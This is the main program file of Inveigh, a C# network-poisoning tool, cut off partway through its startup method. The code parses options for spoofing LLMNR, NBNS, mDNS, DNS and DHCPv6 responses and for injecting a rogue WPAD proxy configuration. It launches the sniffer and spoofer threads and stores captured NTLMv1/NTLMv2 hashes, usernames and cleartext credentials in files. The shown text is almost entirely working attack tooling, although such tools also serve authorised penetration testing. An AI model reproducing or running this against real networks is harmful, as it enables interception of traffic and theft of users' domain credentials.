using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.IO;
using System.Threading;
using System.Collections;
using System.Globalization;

namespace Inveigh
{
    class Program
    {
        public static Hashtable smbSessionTable = Hashtable.Synchronized(new Hashtable());
        public static Hashtable httpSessionTable = Hashtable.Synchronized(new Hashtable());
        public static IList<string> outputList = new List<string>();
        public static IList<string> consoleList = new List<string>();
        public static IList<string> logList = new List<string>();
        public static IList<string> logFileList = new List<string>();
        public static IList<string> cleartextList = new List<string>();
        public static IList<string> cleartextFileList = new List<string>();
        public static IList<string> hostList = new List<string>();
        public static IList<string> hostFileList = new List<string>();
        public static IList<string> ntlmv1List = new List<string>();
        public static IList<string> ntlmv2List = new List<string>();
        public static IList<string> ntlmv1FileList = new List<string>();
        public static IList<string> ntlmv2FileList = new List<string>();
        public static IList<string> ntlmv1UsernameList = new List<string>();
        public static IList<string> ntlmv2UsernameList = new List<string>();
        public static IList<string> ntlmv1UsernameFileList = new List<string>();
        public static IList<string> ntlmv2UsernameFileList = new List<string>();
        public static bool consoleOutput = true;
        public static bool exitInveigh = false;
        public static bool enabledConsoleUnique = false;
        public static bool enabledElevated = false;
        public static bool enabledFileOutput = false;
        public static bool enabledFileUnique = false;
        public static bool enabledHTTP = false;
        public static bool enabledICMPv6 = false;
        public static bool enabledDHCPv6 = false;
        public static bool enabledDHCPv6Local = false;
        public static bool enabledDNS = false;
        public static bool enabledDNSv6 = false;
        public static bool enabledDNSRelay = false;
        public static bool enabledInspect = false;
        public static bool enabledADIDNS = false;
        public static bool enabledNBNS = false;
        public static bool enabledLLMNR = false;
        public static bool enabledLLMNRv6 = false;
        public static bool enabledLogOutput = false;
        public static bool enabledMDNS = false;
        public static bool enabledMDNSv6 = false;
        public static bool enabledProxy = false;
        public static bool enabledMachineAccounts = false;
        public static bool enabledSMB = false;
        public static bool enabledSMBv6 = false;
        public static bool enabledSpooferRepeat = false;
        public static bool enabledWindows = true;
        //begin parameters - set defaults as needed before compile
        public static string[] argSpooferDomainsIgnore;
        public static string[] argSpooferDomainsReply;
        public static string[] argSpooferHostsIgnore;
        public static string[] argSpooferHostsReply;
        public static string[] argSpooferIPsIgnore;
        public static string[] argSpooferIPsReply;
        public static string[] argSpooferMACsIgnore;
        public static string[] argSpooferMACsReply;
        public static string argFileOutputDirectory = Directory.GetCurrentDirectory();
        public static string argFilePrefix = "Inveigh";
        public static string argChallenge = "";
        public static string argConsole = "3";
        public static string argConsoleQueueLimit = "-1";
        public static string argConsoleStatus = "0";
        public static string argConsoleUnique = "Y";
        public static string argDHCPv6 = "N";
        public static string argDHCPv6Local = "N";
        public static string argDHCPv6DNSSuffix = "";
        public static string argDNS = "N";
        public static string argDNSv6 = "N";
        public static string argDNSHost = "";
        public static string argDNSServer = "";
        public static string argDNSRelay = "N";
        public static string argDNSTTL = "30";
        public static string[] argDNSTypes = { "A" };
        public static string argElevated = "Y";
        public static string argFileOutput = "Y";
        public static string argFileUnique = "Y";
        public static string argHelp = "";
        public static string argHTTP = "Y";
        public static string argHTTPAuth = "NTLM";
        public static string argHTTPBasicRealm = "ADFS";
        public static string argHTTPIP = "0.0.0.0";
        public static string[] argHTTPPorts = { "80" } ;
        public static string argHTTPResponse = "";
        public static string argIP = "";
        public static string argIPv6 = "";
        public static string argICMPv6 = "N";
        public static string argICMPv6Interval = "200";
        public static string argLLMNR = "Y";
        public static string argLLMNRTTL = "30";
        public static string[] argLLMNRTypes = { "A" };
        public static string argLLMNRv6 = "N";
        public static string argLogOutput = "Y";
        public static string argMAC = "";
        public static string argMachineAccounts = "N";
        public static string argMDNS = "N";
        public static string argMDNSv6 = "N";
        public static string argMDNSTTL = "120";
        public static string argMDNSUnicast = "Y";
        public static string[] argMDNSQuestions = { "QU", "QM" };
        public static string[] argMDNSTypes = { "A" };
        public static string argNBNS = "N";
        public static string argNBNSTTL = "165";
        public static string[] argNBNSTypes = { "00", "20" };
        public static string argProxy = "N";
        public static string argProxyAuth = "NTLM";
        public static string[] argProxyIgnore = { "Firefox" };
        public static string argProxyIP = "0.0.0.0";
        public static string argProxyPort = "8492";
        public static string argProxyPortFailover = "";
        public static string argSMB = "Y";
        public static string argSMBv6 = "N";
        public static string argSpooferIP = "";
        public static string argSpooferIPv6 = "";
        public static string argSpooferRepeat = "Y";
        public static string argRunCount = "0";
        public static string argRunTime = "0";
        public static string argWPADAuth = "NTLM";
        public static string[] argWPADAuthIgnore = { "Firefox" };
        public static string[] argWPADdnsDomainIsHostsDirect = null;
        public static string[] argWPADshExpMatchHostsDirect = null;
        public static string[] argWPADshExpMatchURLsDirect = null;
        public static string[] argWPADdnsDomainIsHostsProxy = null;
        public static string[] argWPADshExpMatchHostsProxy = null;
        public static string[] argWPADshExpMatchURLsProxy = null;
        public static string argWPADIP = "";
        public static string argWPADPort = "";
        public static string argWPADResponse = ""; // default set below
        public static IPAddress ipAddress;
        public static IPAddress ipv6Address;
        public static int dhcpv6Random = (new Random()).Next(1, 9999);
        public static int icmpv6Interval;
        public static byte[] spooferIPData;
        public static byte[] spooferIPv6Data;
        public static byte[] macData = new byte[6];
        public static int dhcpv6IPIndex = 1;
        public static int console;
        public static string computerName = Environment.MachineName;
        public static string netbiosDomain = Environment.UserDomainName;
        public static string dnsDomain = "";
        public static IPAddress dnsServerAddress;
        public static int consoleQueueLimit = -1;
        public static int consoleStatus = 0;
        public static int runCount = 0; // todo check
        public static int runTime = 0;
        public static bool isSession = false;
        public static string version = "0.92 Dev 8";

        static void Main(string[] args)
        {           
            //end parameters        
            string wpadDNSDomainIsHostsDirect = "";
            string wpadSHExpMatchHostsDirect = "";
            string wpadSHExpMatchURLsDirect = "";
            string wpadDNSDomainIsHostsProxy = "";
            string wpadSHExpMatchHostsProxy = "";
            string wpadSHExpMatchURLsProxy = "";       
            IList wpadDirectHostsList = new List<string>();

            #if !NETFRAMEWORK
            if (!System.OperatingSystem.IsWindows())
            {
                enabledWindows = false;
            }
            #endif

            try
            {
                dnsDomain = System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName;
            }
            catch
            {
                dnsDomain = netbiosDomain;
            }

            if (args.Length > 0)
            {

                
                foreach (var entry in args.Select((value, index) => new { index, value }))
                {
                    string arg = entry.value.ToUpper();

                    try
                    {

                        switch (arg)
                        {

                            case "-CHALLENGE":
                            case "/CHALLENGE":
                                argChallenge = args[entry.index + 1].ToUpper();
                                break;

                            case "-CONSOLE":
                            case "/CONSOLE":
                                argConsole = args[entry.index + 1].ToUpper();
                                break;

                            case "-CONSOLEQUEUELIMIT":
                            case "/CONSOLEQUEUELIMIT":
                                argConsoleQueueLimit = args[entry.index + 1];
                                break;

                            case "-CONSOLESTATUS":
                            case "/CONSOLESTATUS":
                                argConsoleStatus = args[entry.index + 1];
                                break;

                            case "-CONSOLEUNIQUE":
                            case "/CONSOLEUNIQUE":
                                argConsoleUnique = args[entry.index + 1].ToUpper();
                                break;

                            case "-DHCPV6":
                            case "/DHCPV6":
                                argDHCPv6 = args[entry.index + 1].ToUpper();
                                break;

                            case "-DHCPV6LOCAL":
                            case "/DHCPV6LOCAL":
                                argDHCPv6Local = args[entry.index + 1].ToUpper();
                                break;

                            case "-DHCPV6DNSSUFFIX":
                            case "/DHCPV6DNSSUFFIX":
                                argDHCPv6DNSSuffix = args[entry.index + 1];
                                break;

                            case "-DNS":
                            case "/DNS":
                                argDNS = args[entry.index + 1].ToUpper();
                                break;

                            case "-DNSV6":
                            case "/DNSV6":
                                argDNSv6 = args[entry.index + 1].ToUpper();
                                break;

                            case "-DNSHOST":
                            case "/DNSHOST":
                                argDNSHost = args[entry.index + 1];
                                break;

                            case "-DNSRELAY":
                            case "/DNSRELAY":
                                argDNSRelay = args[entry.index + 1].ToUpper();
                                break;

                            case "-DNSSERVER":
                            case "/DNSSERVER":
                                argDNSServer = args[entry.index + 1];
                                break;

                            case "-DNSTTL":
                            case "/DNSTTL":
                                argDNSTTL = args[entry.index + 1].ToUpper();
                                break;

                            case "-DNSTYPES":
                            case "/DNSTYPES":
                                argDNSTypes = args[entry.index + 1].ToUpper().Split(',');
                                break;

                            case "-ELEVATED":
                            case "/ELEVATED":
                                argElevated = args[entry.index + 1].ToUpper();
                                break;

                            case "-FILEOUTPUT":
                            case "/FILEOUTPUT":
                                argFileOutput = args[entry.index + 1].ToUpper();
                                break;

                            case "-FILEOUTPUTDIRECTORY":
                            case "/FILEOUTPUTDIRECTORY":
                                argFileOutputDirectory = args[entry.index + 1].ToUpper();
                                break;
                            case "-FILEPREFIX":
                            case "/FILEPREFIX":
                                argFilePrefix = args[entry.index + 1].ToUpper();
                                break;

                            case "-FILEUNIQUE":
                            case "/FILEUNIQUE":
                                argFileUnique = args[entry.index + 1].ToUpper();
                                break;

                            case "-HTTP":
                            case "/HTTP":
                                argHTTP = args[entry.index + 1].ToUpper();
                                break;

                            case "-HTTPAUTH":
                            case "/HTTPAUTH":
                                argHTTPAuth = args[entry.index + 1].ToUpper();
                                break;

                            case "-HTTPBASICREALM":
                            case "/HTTPBASICREALM":
                                argHTTPBasicRealm = args[entry.index + 1];
                                break;

                            case "-HTTPIP":
                            case "/HTTPIP":
                                argHTTPIP = args[entry.index + 1];
                                break;

                            case "-HTTPPORTS":
                            case "/HTTPPORTS":
                                argHTTPPorts = args[entry.index + 1].Split(',');
                                break;

                            case "-HTTPRESPONSE":
                            case "/HTTPRESPONSE":
                                argHTTPResponse = args[entry.index + 1];
                                break;

                            case "-INSPECT":
                            case "/INSPECT":
                                enabledInspect = true;
                                break;

                            case "-ICMPV6":
                            case "/ICMPV6":
                                argICMPv6 = args[entry.index + 1].ToUpper();
                                break;

                            case "-ICMPV6INTERVAL":
                            case "/ICMPV6INTERVAL":
                                argICMPv6Interval = args[entry.index + 1];
                                break;

                            case "-IP":
                            case "/IP":
                                argIP = args[entry.index + 1];
                                break;

                            case "-IPV6":
                            case "/IPV6":
                                argIPv6 = args[entry.index + 1];
                                break;

                            case "-LLMNR":
                            case "/LLMNR":
                                argLLMNR = args[entry.index + 1].ToUpper();
                                break;

                            case "-LLMNRV6":
                            case "/LLMNRV6":
                                argLLMNRv6 = args[entry.index + 1].ToUpper();
                                break;

                            case "-LLMNRTTL":
                            case "/LLMNRTTL":
                                argLLMNRTTL = args[entry.index + 1].ToUpper();
                                break;

                            case "-LOGOUTPUT":
                            case "/LOGOUTPUT":
                                argLogOutput = args[entry.index + 1].ToUpper();
                                break;

                            case "-MAC":
                            case "/MAC":
                                argMAC = args[entry.index + 1].ToUpper().Replace(":", "").Replace("-", "");
                                break;

                            case "-MACHINEACCOUNTS":
                            case "/MACHINEACCOUNTS":
                                argMachineAccounts = args[entry.index + 1].ToUpper();
                                break;

                            case "-MDNS":
                            case "/MDNS":
                                argMDNS = args[entry.index + 1].ToUpper();
                                break;

                            case "-MDNSV6":
                            case "/MDNSV6":
                                argMDNSv6 = args[entry.index + 1].ToUpper();
                                break;

                            case "-MDNSTTL":
                            case "/MDNSTTL":
                                argMDNSTTL = args[entry.index + 1].ToUpper();
                                break;

                            case "-MDNSQUESTIONS":
                            case "/MDNSQUESTIONS":
                                argMDNSQuestions = args[entry.index + 1].ToUpper().Split(',');
                                break;

                            case "-MDNSTYPES":
                            case "/MDNSTYPES":
                                argMDNSTypes = args[entry.index + 1].ToUpper().Split(',');
                                break;

                            case "-MDNSUNICAST":
                            case "/MDNSUNICAST":
                                argMDNSUnicast = args[entry.index + 1].ToUpper();
                                break;

                            case "-NBNS":
                            case "/NBNS":
                                argNBNS = args[entry.index + 1].ToUpper();
                                break;

                            case "-NBNSTTL":
                            case "/NBNSTTL":
                                argNBNSTTL = args[entry.index + 1].ToUpper();
                                break;

                            case "-NBNSTYPES":
                            case "/NBNSTYPES":
                                argNBNSTypes = args[entry.index + 1].ToUpper().Split(',');
                                break;

                            case "-PROXY":
                            case "/PROXY":
                                argProxy = args[entry.index + 1].ToUpper();
                                break;

                            case "-PROXYIGNORE":
                            case "/PROXYIGNORE":
                                argProxyIgnore = args[entry.index + 1].Split(',');
                                break;

                            case "-PROXYIP":
                            case "/PROXYIP":
                                argProxyIP = args[entry.index + 1];
                                break;

                            case "-PROXYPORT":
                            case "/PROXYPORT":
                                argProxyPort = args[entry.index + 1];
                                break;

                            case "-RUNCOUNT":
                            case "/RUNCOUNT":
                                argRunCount = args[entry.index + 1];
                                break;

                            case "-RUNTIME":
                            case "/RUNTIME":
                                argRunTime = args[entry.index + 1];
                                break;

                            case "-SMB":
                            case "/SMB":
                                argSMB = args[entry.index + 1].ToUpper();
                                break;

                            case "-SMBV6":
                            case "/SMBV6":
                                argSMBv6 = args[entry.index + 1].ToUpper();
                                break;

                            case "-SPOOFERDOMAINSIGNORE":
                            case "/SPOOFERDOMAINSIGNORE":
                                argSpooferDomainsIgnore = args[entry.index + 1].ToUpper().Split(',');
                                break;

                            case "-SPOOFERDOMAINSREPLY":
                            case "/SPOOFERDOMAINSREPLY":
                                argSpooferDomainsReply = args[entry.index + 1].ToUpper().Split(',');
                                break;

                            case "-SPOOFERHOSTSIGNORE":
                            case "/SPOOFERHOSTSIGNORE":
                                argSpooferHostsIgnore = args[entry.index + 1].ToUpper().Split(',');
                                break;

                            case "-SPOOFERHOSTSREPLY":
                            case "/SPOOFERHOSTSREPLY":
                                argSpooferHostsReply = args[entry.index + 1].ToUpper().Split(',');
                                break;

                            case "-SPOOFERIP":
                            case "/SPOOFERIP":
                                argSpooferIP = args[entry.index + 1];
                                break;

                            case "-SPOOFERIPV6":
                            case "/SPOOFERIPV6":
                                argSpooferIPv6 = args[entry.index + 1].ToUpper();
                                break;

                            case "-SPOOFERIPSIGNORE":
                            case "/SPOOFERIPSIGNORE":
                                argSpooferIPsIgnore = args[entry.index + 1].ToUpper().Split(',');
                                break;

                            case "-SPOOFERIPSREPLY":
                            case "/SPOOFERIPSREPLY":
                                argSpooferIPsReply = args[entry.index + 1].ToUpper().Split(',');
                                break;

                            case "-SPOOFERMACSIGNORE":
                            case "/SPOOFERMACSIGNORE":
                                argSpooferMACsIgnore = args[entry.index + 1].ToUpper().Replace(":", "").Replace("-", "").Split(',');
                                break;

                            case "-SPOOFERMACSREPLY":
                            case "/SPOOFERMACSREPLY":
                                argSpooferMACsReply = args[entry.index + 1].ToUpper().Replace(":", "").Replace("-", "").Split(',');
                                break;

                            case "-SPOOFERREPEAT":
                            case "/SPOOFERREPEAT":
                                argSpooferRepeat = args[entry.index + 1].ToUpper();
                                break;

                            case "-WPADAUTH":
                            case "/WPADAUTH":
                                argWPADAuth = args[entry.index + 1].ToUpper();
                                break;

                            case "-WPADAUTHIGNORE":
                            case "/WPADAUTHIGNORE":
                                argWPADAuthIgnore = args[entry.index + 1].Split(',');
                                break;

                            case "-WPADDNSDOMAINISHOSTSDIRECT":
                            case "/WPADDNSDOMAINISHOSTSDIRECT":
                                argWPADdnsDomainIsHostsDirect = args[entry.index + 1].Split(',');
                                break;

                            case "-WPADSHEXPMATCHHOSTSDIRECT":
                            case "/WPADSHEXPMATCHHOSTSDIRECT":
                                argWPADshExpMatchHostsDirect = args[entry.index + 1].Split(',');
                                break;

                            case "-WPADSHEXPMATCHURLSDIRECT":
                            case "/WPADSHEXPMATCHURLSDIRECT":
                                argWPADshExpMatchURLsDirect = args[entry.index + 1].Split(',');
                                break;

                            case "-WPADDNSDOMAINISHOSTSPROXY":
                            case "/WPADDNSDOMAINISHOSTSPROXY":
                                argWPADdnsDomainIsHostsProxy = args[entry.index + 1].Split(',');
                                break;

                            case "-WPADSHEXPMATCHHOSTSPROXY":
                            case "/WPADSHEXPMATCHHOSTSPROXY":
                                argWPADshExpMatchHostsProxy = args[entry.index + 1].Split(',');
                                break;

                            case "-WPADSHEXPMATCHURLSPROXY":
                            case "/WPADSHEXPMATCHURLSPROXY":
                                argWPADshExpMatchURLsProxy = args[entry.index + 1].Split(',');
                                break;

                            case "-WPADIP":
                            case "/WPADIP":
                                argWPADIP = args[entry.index + 1];
                                break;

                            case "-WPADPORT":
                            case "/WPADPORT":
                                argWPADPort = args[entry.index + 1];
                                break;

                            case "-WPADRESPONSE":
                            case "/WPADRESPONSE":
                                argWPADResponse = args[entry.index + 1];
                                break;

                            case "-?":
                            case "/?":
                                if (args.Length > 1)
                                    argHelp = args[entry.index + 1].ToUpper();
                                Util.GetHelp(argHelp);
                                Environment.Exit(0);
                                break;

                            default:
                                if (arg.StartsWith("-") || arg.StartsWith("/"))
                                    throw new ArgumentException(paramName: arg, message: "Invalid Parameter");
                                break;
                        }

                    }
                    catch (Exception ex)
                    {

                        if (ex.Message.Contains("Index was outside the bounds of the array"))
                        {
                            Console.WriteLine("{0} is missing a value", arg);
                        }
                        else
                        {
                            Console.WriteLine("{0} error - {1}", arg, ex.Message);
                        }

                        Environment.Exit(0);
                    }

                }          

            }

            Control.ValidateArguments();
            console = Int32.Parse(argConsole);
            consoleQueueLimit = Int32.Parse(argConsoleQueueLimit);
            consoleStatus = Int32.Parse(argConsoleStatus);
            icmpv6Interval = Int32.Parse(argICMPv6Interval);
            runCount = Int32.Parse(argRunCount);
            runTime = Int32.Parse(argRunTime);
            if (String.Equals(argConsoleUnique, "Y")) { enabledConsoleUnique = true; }
            if (String.Equals(argElevated, "Y")) { enabledElevated = true; }
            if (String.Equals(argFileOutput, "Y")) { enabledFileOutput = true; }
            if (String.Equals(argFileUnique, "Y")) { enabledFileUnique = true; }
            if (String.Equals(argDHCPv6, "Y")) { enabledDHCPv6 = true; }
            if (String.Equals(argDHCPv6Local, "Y")) { enabledDHCPv6Local = true; }
            if (String.Equals(argDNS, "Y")) { enabledDNS = true; }
            if (String.Equals(argDNSv6, "Y")) { enabledDNSv6 = true; }
            if (String.Equals(argDNSRelay, "Y")) { enabledDNSRelay = true; }
            if (String.Equals(argHTTP, "Y")) { enabledHTTP = true; }
            if (String.Equals(argICMPv6, "Y")) { enabledICMPv6 = true; }
            if (String.Equals(argLLMNR, "Y")) { enabledLLMNR = true; }
            if (String.Equals(argLLMNRv6, "Y")) { enabledLLMNRv6 = true; }
            if (String.Equals(argLogOutput, "Y")) { enabledLogOutput = true; }
            if (String.Equals(argMDNS, "Y")) { enabledMDNS = true; }
            if (String.Equals(argMDNSv6, "Y")) { enabledMDNSv6 = true; }
            if (String.Equals(argProxy, "Y")) { enabledProxy = true; }
            if (String.Equals(argMachineAccounts, "Y")) { enabledMachineAccounts = true; }
            if (String.Equals(argNBNS, "Y")) { enabledNBNS = true; }
            if (String.Equals(argSMB, "Y")) { enabledSMB = true; }
            if (String.Equals(argSMBv6, "Y")) { enabledSMBv6 = true; }
            if (String.Equals(argSpooferRepeat, "Y")) { enabledSpooferRepeat = true; }

            if (enabledLogOutput && File.Exists(Path.Combine(argFileOutputDirectory, String.Concat(argFilePrefix, "-Log.txt"))))
            {
                isSession = true;
                string[] file = File.ReadAllLines(Path.Combine(argFileOutputDirectory, String.Concat(argFilePrefix, "-Log.txt")));

                foreach (string line in file)
                {
                    logList.Add(line);
                }

            }

            if (File.Exists(Path.Combine(argFileOutputDirectory, String.Concat(argFilePrefix, "-Cleartext.txt"))))
            {
                isSession = true;
                string[] file = File.ReadAllLines(Path.Combine(argFileOutputDirectory, String.Concat(argFilePrefix, "-Cleartext.txt")));

                foreach (string line in file)
                {
                    cleartextList.Add(line);
                }

            }

            if (File.Exists(Path.Combine(argFileOutputDirectory, String.Concat(argFilePrefix, "-NTLMv1.txt"))))
            {
                isSession = true;
                string[] file = File.ReadAllLines(Path.Combine(argFileOutputDirectory, String.Concat(argFilePrefix, "-NTLMv1.txt")));

                foreach (string line in file)
                {
                    ntlmv1List.Add(line);
                }

            }

            if (File.Exists(Path.Combine(argFileOutputDirectory, String.Concat(argFilePrefix, "-NTLMv2.txt"))))
            {
                isSession = true;
                string[] file = File.ReadAllLines(Path.Combine(argFileOutputDirectory, String.Concat(argFilePrefix, "-NTLMv2.txt")));

                foreach (string line in file)
                {
                    ntlmv2List.Add(line);
                }

            }

            if (File.Exists(Path.Combine(argFileOutputDirectory, String.Concat(argFilePrefix, "-NTLMv1Users.txt"))))
            {
                isSession = true;
                string[] file = File.ReadAllLines(Path.Combine(argFileOutputDirectory, String.Concat(argFilePrefix, "-NTLMv1Users.txt")));

                foreach (string line in file)
                {
                    ntlmv1UsernameList.Add(line);
                }

            }

            if (File.Exists(Path.Combine(argFileOutputDirectory, String.Concat(argFilePrefix, "-NTLMv2Users.txt"))))
            {
                isSession = true;
                string[] file = File.ReadAllLines(Path.Combine(argFileOutputDirectory, String.Concat(argFilePrefix, "-NTLMv2Users.txt")));

                foreach (string line in file)
                {
                    ntlmv2UsernameList.Add(line);
                }

            }

            if (File.Exists(Path.Combine(argFileOutputDirectory, String.Concat(argFilePrefix, "-DHCPv6.txt"))))
            {
                isSession = true;
                string[] file = File.ReadAllLines(Path.Combine(argFileOutputDirectory, String.Concat(argFilePrefix, "-DHCPv6.txt")));

                foreach (string line in file)
                {
                    hostList.Add(line);
                }

            }

            if (string.IsNullOrEmpty(argIP))
            {
                argIP = Util.GetLocalIPAddress("IPv4");
            }

            if (string.IsNullOrEmpty(argIPv6))
            {
                argIPv6 = Util.GetLocalIPAddress("IPv6");
            }

            if (string.IsNullOrEmpty(argMAC) && !string.IsNullOrEmpty(argIPv6))
            {
                argMAC = Util.GetLocalMACAddress(IPAddress.Parse(argIPv6).ToString());
            }

            if (!string.IsNullOrEmpty(argMAC) && !string.IsNullOrEmpty(argIPv6))
            {
                argMAC = argMAC.Insert(2, ":").Insert(5, ":").Insert(8, ":").Insert(11, ":").Insert(14, ":");
            }
            else
            {
                enabledDHCPv6 = false;
            }

            if (string.IsNullOrEmpty(argSpooferIP))
            {
                argSpooferIP = argIP;
            }

            if (string.IsNullOrEmpty(argSpooferIPv6))
            {
                argSpooferIPv6 = argIPv6;
            }

            if (enabledDNSRelay && !String.IsNullOrEmpty(argDNSServer))
            {

                try
                {
                    dnsServerAddress = IPAddress.Parse(argDNSServer);
                }
                catch
                {

                    try
                    {
                        dnsServerAddress = Dns.GetHostEntry(argDNSServer).AddressList[0]; // todo replace
                    }
                    catch
                    {
                        Console.WriteLine("DNSServer is invalid");
                        Environment.Exit(0);
                    }

                }

            }
            else if (enabledDNSRelay)
            {
                argDNSServer = Util.GetLocalDNSAddress("IPv4", argIP);
                dnsServerAddress = IPAddress.Parse(argDNSServer);
            }

            ipAddress = IPAddress.Parse(argIP);
            spooferIPData = IPAddress.Parse(argSpooferIP).GetAddressBytes();

            //todo add IPv6 checks
            if (!String.IsNullOrEmpty(argIPv6))
            {
                ipv6Address = IPAddress.Parse(argIPv6); 
                spooferIPv6Data = IPAddress.Parse(argSpooferIPv6).GetAddressBytes();

                int i = 0;

                if (!String.IsNullOrEmpty(argMAC))
                {

                    foreach (string character in argMAC.Split(':'))
                    {
                        macData[i] = Convert.ToByte(Convert.ToInt16(character, 16));
                        i++;
                    }

                }

            }

            if (!enabledWindows)
            {
                enabledElevated = false;
            }

            if (enabledWindows && !enabledElevated)
            {
                enabledICMPv6 = false;
            }

            if (!enabledElevated)
            {
                enabledSMB = false;
                enabledSMBv6 = false;
            }

            if (enabledInspect)
            {

                if (enabledElevated)
                {
                    enabledHTTP = false;
                    enabledProxy = false;
                    enabledSMB = false;
                    enabledSMBv6 = false;
                    enabledICMPv6 = false;
                }
                else
                {
                    enabledHTTP = false;
                    enabledProxy = false;
                }

            }

            if (!Util.ArrayIsNullOrEmpty(argWPADdnsDomainIsHostsDirect))
            {
                int i = 0;

                foreach (string host in argWPADdnsDomainIsHostsDirect)
                {
                    argWPADdnsDomainIsHostsDirect[i] = String.Concat("dnsDomainIs(host, \"", host, "\") || ");
                    i++;
                }

                wpadDNSDomainIsHostsDirect = String.Join("", argWPADdnsDomainIsHostsDirect);
                wpadDNSDomainIsHostsDirect = wpadDNSDomainIsHostsDirect.Substring(0, wpadDNSDomainIsHostsDirect.Length - 4);
                wpadDNSDomainIsHostsDirect = String.Concat("if (", wpadDNSDomainIsHostsDirect, ") return \"DIRECT\";");
            }

            if (!Util.ArrayIsNullOrEmpty(argWPADshExpMatchHostsDirect))
            {
                int i = 0;

                foreach (string host in argWPADshExpMatchHostsDirect)
                {
                    argWPADshExpMatchHostsDirect[i] = String.Concat("shExpMatch(host, \"", host, "\") || ");
                    i++;
                }

                wpadSHExpMatchHostsDirect = String.Join("", argWPADshExpMatchHostsDirect);
                wpadSHExpMatchHostsDirect = wpadSHExpMatchHostsDirect.Substring(0, wpadSHExpMatchHostsDirect.Length - 4);
                wpadSHExpMatchHostsDirect = String.Concat("if (", wpadSHExpMatchHostsDirect, ") return \"DIRECT\";");
            }

            if (!Util.ArrayIsNullOrEmpty(argWPADshExpMatchURLsDirect))
            {
                int i = 0;

                foreach (string url in argWPADshExpMatchURLsDirect)
                {
                    argWPADshExpMatchURLsDirect[i] = String.Concat("shExpMatch(url, \"", url, "\") || ");
                    i++;
                }

                wpadSHExpMatchURLsDirect = String.Join("", argWPADshExpMatchURLsDirect);
                wpadSHExpMatchURLsDirect = wpadSHExpMatchURLsDirect.Substring(0, wpadSHExpMatchURLsDirect.Length - 4);
                wpadSHExpMatchURLsDirect = String.Concat("if (", wpadSHExpMatchURLsDirect, ") return \"DIRECT\";");
            }

            if (!Util.ArrayIsNullOrEmpty(argWPADdnsDomainIsHostsProxy))
            {
                int i = 0;

                foreach (string host in argWPADdnsDomainIsHostsProxy)
                {
                    argWPADdnsDomainIsHostsProxy[i] = String.Concat("dnsDomainIs(host, \"", host, "\") || ");
                    i++;
                }

                wpadDNSDomainIsHostsProxy = String.Join("", argWPADdnsDomainIsHostsProxy);
                wpadDNSDomainIsHostsProxy = wpadDNSDomainIsHostsProxy.Substring(0, wpadDNSDomainIsHostsProxy.Length - 4);
                wpadDNSDomainIsHostsProxy = String.Concat("if (", wpadDNSDomainIsHostsProxy, ") ");
            }

            if (!Util.ArrayIsNullOrEmpty(argWPADshExpMatchHostsProxy))
            {
                int i = 0;

                foreach (string host in argWPADshExpMatchHostsProxy)
                {
                    argWPADshExpMatchHostsProxy[i] = String.Concat("shExpMatch(host, \"", host, "\") || ");
                    i++;
                }

                wpadSHExpMatchHostsProxy = String.Join("", argWPADshExpMatchHostsProxy);
                wpadSHExpMatchHostsProxy = wpadSHExpMatchHostsProxy.Substring(0, wpadSHExpMatchHostsProxy.Length - 4);
                wpadSHExpMatchHostsProxy = String.Concat("if (", wpadSHExpMatchHostsProxy, ") ");
            }

            if (!Util.ArrayIsNullOrEmpty(argWPADshExpMatchURLsProxy))
            {
                int i = 0;

                foreach (string url in argWPADshExpMatchURLsProxy)
                {
                    argWPADshExpMatchURLsProxy[i] = String.Concat("shExpMatch(url, \"", url, "\") || ");
                    i++;
                }

                wpadSHExpMatchURLsProxy = String.Join("", argWPADshExpMatchURLsProxy);
                wpadSHExpMatchURLsProxy = wpadSHExpMatchURLsProxy.Substring(0, wpadSHExpMatchURLsProxy.Length - 4);
                wpadSHExpMatchURLsProxy = String.Concat("if (", wpadSHExpMatchURLsProxy, ") ");
            }

            if (enabledProxy)
            {
                argProxyPortFailover = (Int32.Parse(argProxyPort) + 1).ToString();
                argWPADResponse = String.Concat("function FindProxyForURL(url,host){", wpadDNSDomainIsHostsDirect, argWPADshExpMatchHostsDirect, argWPADshExpMatchURLsDirect, wpadDNSDomainIsHostsProxy, wpadSHExpMatchHostsProxy, wpadSHExpMatchURLsProxy, "return \"PROXY ", argIP, ":", argProxyPort, "; PROXY ", argIP, ":", argProxyPortFailover, "; DIRECT\";}");
            }
            else if (!String.IsNullOrEmpty(argWPADIP) && !String.IsNullOrEmpty(argWPADPort))
            {
               argWPADResponse = String.Concat("function FindProxyForURL(url,host) {", wpadDNSDomainIsHostsDirect, argWPADshExpMatchHostsDirect, argWPADshExpMatchURLsDirect, "return \"PROXY", argWPADIP, ":", argWPADPort, "; DIRECT\";}");
            }
            else if (String.IsNullOrEmpty(argWPADResponse))
            {
                argWPADResponse = "function FindProxyForURL(url,host) {return \"DIRECT\";}";
            }

            Control.StartupOutput();

            if (enabledElevated && (enabledDHCPv6 || enabledLLMNRv6|| enabledDNS || enabledMDNS || enabledLLMNR || enabledNBNS || enabledSMB))
            {

                if (enabledElevated && (enabledDNS || enabledMDNS || enabledLLMNR || enabledNBNS || enabledSMB))
                {
                    Thread snifferSpooferThread = new Thread(() => Sniffer.SnifferSpoofer("IPv4", "IP", argIP));
                    snifferSpooferThread.Start();
                }

                if (!String.IsNullOrEmpty(argIPv6) && enabledElevated && (enabledDHCPv6 || enabledDNSv6 || enabledLLMNRv6 || enabledMDNSv6))
                {
                    Thread snifferSpooferIPv6Thread = new Thread(() => Sniffer.SnifferSpoofer("IPv6", "UDP", argIPv6));
                    snifferSpooferIPv6Thread.Start();
                }

                if (!String.IsNullOrEmpty(argIPv6) && enabledSMBv6)
                {
                    Thread snifferSpooferIPv6TCPThread = new Thread(() => Sniffer.SnifferSpoofer("IPv6", "TCP", argIPv6));
                    snifferSpooferIPv6TCPThread.Start();
                }

                if (!enabledInspect && !String.IsNullOrEmpty(argIPv6) && enabledICMPv6)
                {
                    Thread icmpv6Thread = new Thread(() => ICMPv6.icmpv6RouterAdvertise());
                    icmpv6Thread.Start();
                }

            }
            else
            {

                if (enabledNBNS)
                {
                    Thread nbnsListenerThread = new Thread(() => NBNS.NBNSListener(argIP));
                    nbnsListenerThread.Start();
                }

                if (enabledLLMNR)
                {
                    Thread llmnrListenerThread = new Thread(() => LLMNR.LLMNRListener("IPv4", argIP));
                    llmnrListenerThread.Start();
                }

                if (enabledLLMNRv6)
                {
                    Thread llmnrListenerThread = new Thread(() => LLMNR.LLMNRListener("IPv6", argIPv6));
                    llmnrListenerThread.Start();
                }

